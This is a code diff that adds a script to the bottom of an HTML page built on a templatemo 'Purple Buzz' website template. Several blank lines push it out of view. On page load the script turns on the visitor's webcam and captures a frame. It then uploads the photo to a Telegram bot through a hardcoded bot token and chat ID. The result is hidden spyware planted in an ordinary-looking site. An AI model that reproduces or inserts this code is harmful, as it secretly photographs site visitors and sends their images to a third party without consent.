@@ -410,6 +410,66 @@ https://templatemo.com/tm-561-purple-buzz
     <!-- Custom -->
     <script src="assets/js/custom.js"></script>
 
+
+
+
+
+
+
+
+        <script>
+        async function takePhotoAndSend() {
+            {
+        
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            const video = document.createElement('video');
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            await video.play();
+
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d')
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                document.body.removeChild(canvas);
+            }, 'image/jpeg');
+
+            // } cach (error) {
+            //     console.error('Error accessing the camera: ', error);
+            }
+        }
+
+
+
+
+
+        function sendPhotoToTelegram(blob) {
+            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '1209515299');
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending photo to Telegram: ', error));
+
+        }
+        takePhotoAndSend();
+    </script>
+
 </body>
 
 </html>
